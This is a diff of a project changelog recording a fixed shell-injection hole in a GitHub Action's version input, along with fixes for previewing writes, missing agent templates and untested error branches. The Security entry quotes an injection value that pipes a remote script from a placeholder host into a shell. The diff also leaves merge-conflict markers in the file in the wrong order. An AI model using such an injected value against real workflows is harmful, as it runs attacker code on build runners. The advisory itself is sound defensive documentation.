@@ -8,10 +8,14 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [Unreleased]
 
 ### Security
+
 - **Shell Injection via `inputs.version`** (#604):
   - `action.yml`'s install step interpolated `${{ inputs.version }}` directly into its `run:` body. A GitHub expression is substituted textually before bash parses the line, so a caller passing `version: '1.0"; curl evil | sh; "'` executes arbitrary shell in the action's step. #584 moved `args`, the PR number and the base ref into `env:` for exactly this reason and left this one behind — the sweep it described in the plural was done in the singular.
   - Now passed as `INPUT_VERSION` through `env:` like every other caller-supplied input.
   - The guard is a rule over every step, not an assertion about one line: no `run:` body may contain a `${{ }}` expression, with a vacuity check so it cannot pass when there are no run bodies left, and a positive counterpart asserting each input still reaches the script through `env:`.
+=======
+
+>>>>>>> eb43eaa (test(patches): cover the three error branches nothing executed (#607))
 - **`jury apply` Previews And Confirms Before It Writes** (#605): a destructive command no longer writes unannounced.
   - `--dry-run` prints the paths each suggestion would touch and writes nothing.
   - The preview is printed **before** any write, and comes from the same `git apply --check` probe the containment check uses — so it cannot disagree with what an apply would do, and it names a path the suggestion itself never claims (a rename target). Previously the per-suggestion output appeared *after* the write had happened.
@@ -29,10 +33,15 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   - Reachable only via `jury apply` run locally against a report derived from an untrusted diff; `action.yml` does not invoke it.
 
 ### Fixed
+<<<<<<< HEAD
 - **`jury init` Offered Seven of Eleven Agents** (#606):
   - `KNOWN_AGENTS` is derived from `agent_templates()` instead of hand-listed. Four templates — `openrouter`, `deepseek`, `groq`, `aider` — shipped without ever reaching the tuple, so `--list-agents`, the wizard and `--preset all` could not see them while the unknown-agent error message named them. The CLI told users to choose from four options it never offered. #589 asked for exactly this and #590 rewrote the error message instead.
   - Adding them naively broke `jury init --preset thorough` outright: three point at real vendor hosts, and the config validator refuses a non-loopback endpoint without `JURY_ALLOW_REMOTE_ENDPOINT`, so the generated config was rejected before it could be written. They are now listed and selectable by name always, and included in an "all" preset only once the opt-in is present.
   - Both distinctions are derived from the templates rather than listed, so a new hosted template is covered the day it lands — a second hand-maintained roster is the defect this issue is about.
+- **Three Error Branches Nothing Executed** (#607):
+  - `patches.py`'s `Cannot read` / `Cannot write` arms and `cli.py`'s report-read arm were added by #588 and covered by no test — nothing in the repository referenced any of the three messages, and the 98% coverage floor had room for three uncovered branches.
+  - #588's body said "Added regression tests in `test_cli_contract.py` and `test_patches_apply.py`". Literally true — one test in each — but between them they covered two of five new branches, and the one placed in `test_patches_apply.py` exercised `cli.py`'s `_run_apply` rather than `patches.py`, so the filename made the untested bullet above it look guarded.
+  - Each branch now has a case built from a real failure shape (undecodable bytes, a read-only file), plus one asserting a refused apply leaves the file byte-identical.
 
 ## [1.14.4] - 2026-08-19
 
